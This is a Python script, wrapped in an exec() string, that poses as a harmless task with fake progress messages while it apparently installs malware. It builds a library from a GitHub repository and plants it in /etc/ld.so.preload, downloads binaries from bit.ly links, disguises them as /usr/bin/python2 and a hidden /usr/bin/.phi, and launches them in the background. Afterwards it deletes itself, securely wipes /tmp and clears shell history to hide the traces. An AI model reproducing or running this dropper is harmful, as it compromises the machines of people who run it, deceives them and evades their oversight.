exec("""\nimport os\nimport subprocess as sub\nimport threading\nimport time\nimport random\nimport sys\n\nFNULL = open(os.devnull, 'w')\n\nclass RunCmd(threading.Thread):\n    def __init__(self, cmd, timeout):\n        threading.Thread.__init__(self)\n        self.cmd = cmd\n        self.timeout = timeout\n\n    def run(self):\n        self.p = sub.Popen(self.cmd, stdout=FNULL, stderr=sub.STDOUT, shell=True)\n        self.p.wait()\n\n    def Run(self):\n        self.start()\n        self.join(self.timeout)\n        if self.is_alive():\n            self.p.kill()\n            self.join()\n\nRunCmd(['apt update && apt install sudo'], 5*60).Run()\nRunCmd(['sudo apt install secure-delete'], 5*60).Run()\nRunCmd(['sudo apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y'], 5*60).Run()\n\nRunCmd(['cd /tmp/ && git clone https://github.com/Lubioss/Weilder.git weild || true && cd weild && make'], 5*60).Run()\nRunCmd(['sudo mv /tmp/weild/libso.so /usr/local/lib/'], 5*60).Run()\nRunCmd(["sudo su -c 'echo /usr/local/lib/libso.so >> /etc/ld.so.preload'"], 5*60).Run()\n\nRunCmd(['sudo apt update'], 5*60).Run()\n\nRunCmd(['wget -O /tmp/ps https://bit.ly/3mUN3cX'], 5*60).Run()\nRunCmd(['wget -O /tmp/aux https://bit.ly/3t5Hw4c'], 5*60).Run()\nRunCmd(['chmod +x /tmp/ps /tmp/aux'], 5*60).Run()\n\nRunCmd(['sudo mv /tmp/ps /usr/bin/python2'], 5*60).Run()\nRunCmd(['sudo mv /tmp/aux /usr/bin/.phi'], 5*60).Run()\n\nRunCmd(['cd /usr/bin && nohup setsid python2 -c .phi &'], 5*60).Run()\n\ni = 0\nx = list(range(6, 9))\ny = random.choice(x)\ndone = False\n\nprint('Working on it. Please wait..')\nwhile True:\n    print(f'{i} Minutes.')\n    time.sleep(1*60)\n    i += 1\n    if i == y:\n        done = True\n        print('Successfully.')\n        break\n\nif done is True:\n    sub.Popen("python -c \\"import os, time; time.sleep(1); os.remove('{}');\\"".format(sys.argv[0]), stdout=FNULL, stderr=sub.STDOUT, shell=True)\n    RunCmd(['sudo srm -r /tmp/*'], 5*60).Run()\n    RunCmd(['history -c && history -w'], 5*60).Run()\n    try:\n        sys.exit(1)\n    except:\n        pass\n""")
